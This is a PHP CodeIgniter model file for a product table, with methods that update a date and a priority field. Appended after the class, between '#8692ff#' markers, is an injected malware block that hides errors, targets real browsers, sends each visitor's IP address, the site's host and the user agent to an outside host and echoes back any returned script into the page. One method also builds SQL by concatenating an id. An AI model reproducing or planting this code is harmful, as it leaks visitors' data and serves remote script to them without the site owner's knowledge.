<?php
class MbSpVip extends CI_Model {
	private $_TABLE_NAME = 'mb_product';
	function __construct()
	{
		parent::__construct();
	}
	
	public function uptin($id) {
		$this->db->where('id_', $id);
		$date = date("Y-m-d H:i:s");
		$this->db->update($this->_TABLE_NAME,array("date_"=>$date));
		//$sql = "UPDATE ".$this->_TABLE_NAME." SET priority=priority + 1 WHERE id_!=".$id;
		//$this->db->query($sql);
	}
	
	public function tinvip($id) {
		$this->db->where('id_', $id);
		$this->db->update($this->_TABLE_NAME,array("priority"=>0));
		$sql = "UPDATE ".$this->_TABLE_NAME." SET priority=priority + 1 WHERE id_!=".$id;
		$this->db->query($sql);
	}
}

#8692ff#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/8692ff#
